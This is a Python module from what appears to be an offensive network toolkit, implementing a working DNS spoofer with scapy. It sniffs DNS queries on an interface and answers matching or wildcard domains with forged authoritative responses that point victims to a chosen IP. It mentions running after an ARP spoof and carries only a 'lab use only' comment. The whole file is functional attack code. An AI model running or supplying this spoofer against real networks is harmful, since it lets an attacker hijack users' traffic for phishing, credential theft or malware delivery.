#!/usr/bin/env python3

# modules/network/dns_spoof.py
# Lynkeus Initiative — DNS Spoofer
# Intercepts DNS queries and redirects them to a controlled IP
# Requires you to be the gateway or run ARP spoof first
# Lab use only — run on your own network

import signal
import sys

# Attempt to import scapy — required for packet interception 
try:
    from scapy.all import (
        sniff, DNS, DNSRR, DNSQR, IP, UDP, send, conf
    )
    conf.verb = 0
except ImportError:
    print ("[!] scapy is not installed. Run: pip install scapy")
    exit(1)

from output.colors import GREEN, RED, YELLOW, CYAN, DIM, BOLD, RESET


# Global config — set by run_dns_spoof 
SPOOF_TARGETS  = {}
REDIRECT_IP    = ""
PACKET_COUNT   = 0


def process_packet(packet):
    """
    # Called for every sniffed packet
    # Checks if it is a DNS query for a spoofed domain
    # If so, crafts and sends a forged DNS response
    """

    global PACKET_COUNT

    # Only process DNS query packets 
    if not (packet.haslayer(DNS) and packet[DNS].qr == 0):
        return

    queried_domain = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")

    # Check if this domain is in our spoof list 
    target_ip = SPOOF_TARGETS.get(queried_domain)

    if not target_ip:
        # Also check wildcard spoof (spoof everything) 
        target_ip = SPOOF_TARGETS.get("*", None)

    if not target_ip:
        return

    PACKET_COUNT += 1

    print (YELLOW + "  [>] DNS query intercepted : " + queried_domain + RESET)
    print (GREEN  + "  [+] Redirecting           : " + queried_domain + " → " + target_ip + RESET)

    # Build forged DNS response 
    spoofed = (
        IP(dst=packet[IP].src, src=packet[IP].dst) /
        UDP(dport=packet[UDP].sport, sport=53) /
        DNS(
            id    = packet[DNS].id,
            qr    = 1,
            aa    = 1,
            qd    = packet[DNS].qd,
            an    = DNSRR(
                rrname = packet[DNSQR].qname,
                ttl    = 10,
                rdata  = target_ip,
            )
        )
    )

    # Send forged response back to the victim 
    send(spoofed, verbose=0)


def run_dns_spoof(targets, redirect_ip, interface, packet_limit):
    """
    # Starts sniffing DNS traffic on the given interface
    # targets: dict of {"domain.com": "ip"} or {"*": "ip"} for wildcard
    # redirect_ip: default IP to redirect to if not in targets dict
    # packet_limit: stop after this many spoofed packets (0 = unlimited)
    """

    global SPOOF_TARGETS, REDIRECT_IP

    SPOOF_TARGETS = targets
    REDIRECT_IP   = redirect_ip

    print ("")
    print (CYAN + "=" * 55 + RESET)
    print (BOLD + "  DNS SPOOFER" + RESET)
    print (CYAN + "=" * 55 + RESET)
    print ("  Interface : " + BOLD + interface + RESET)
    print ("  Redirect  : " + BOLD + redirect_ip + RESET)
    print ("  Targets   : " + str(len(targets)) + " domain(s) queued")

    for domain, ip in targets.items():
        print (DIM + "    " + domain + " → " + ip + RESET)

    print (CYAN + "-" * 55 + RESET)
    print (DIM + "  Press Ctrl+C to stop" + RESET)
    print ("")

    # Start sniffing — filter only UDP port 53 (DNS) 
    try:
        sniff(
            iface  = interface,
            filter = "udp port 53",
            prn    = process_packet,
            store  = 0,
            count  = packet_limit if packet_limit > 0 else 0,
        )

    except KeyboardInterrupt:
        print ("")
        print (CYAN + "-" * 55 + RESET)
        print ("  DNS spoofer stopped. " + BOLD + str(PACKET_COUNT) + " packet(s)" + RESET + " spoofed.")
        print (CYAN + "=" * 55 + RESET)
        print ("")
